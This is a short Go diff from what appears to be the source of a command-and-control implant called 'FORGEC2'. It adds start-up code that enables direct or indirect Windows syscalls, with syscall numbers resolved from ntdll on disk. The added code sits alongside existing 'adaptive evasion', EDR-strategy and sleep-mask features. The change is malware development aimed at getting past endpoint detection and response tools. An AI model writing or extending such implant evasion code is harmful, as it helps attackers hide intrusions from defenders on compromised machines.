@@ -134,6 +134,21 @@ func init() {
 	// below: enableSleepMask is one of the strategy flags it sets.
 	applyAdaptiveEvasion()
 
+	// Direct/indirect syscall policy: independent of the sleep-mask opt-in.
+	// When enabled, resolve SSNs once from ntdll on disk at startup; if the
+	// table is incomplete, refuse to use indirect syscalls (no silent fallback
+	// to a wrong syscall number on the target).
+	syscallPolicyEnabled = strings.ToLower(SyscallPolicyStr) == "true" || SyscallPolicyStr == "1"
+	if v := os.Getenv("FORGEC2_SYSCALL_POLICY"); v == "1" || strings.ToLower(v) == "true" {
+		syscallPolicyEnabled = true
+	}
+	if syscallPolicyEnabled && runtime.GOOS == "windows" {
+		if err := initSyscallPolicy(); err != nil {
+			logDebugf("[syscall] policy resolution failed: %v", err)
+			useIndirectSyscall = false
+		}
+	}
+
 	// Sleep mask: initialize the platform infrastructure, then honor the EDR
 	// strategy's opt-in. An operator-set mask (set_sleep_mask task) activates
 	// it independently at runtime.
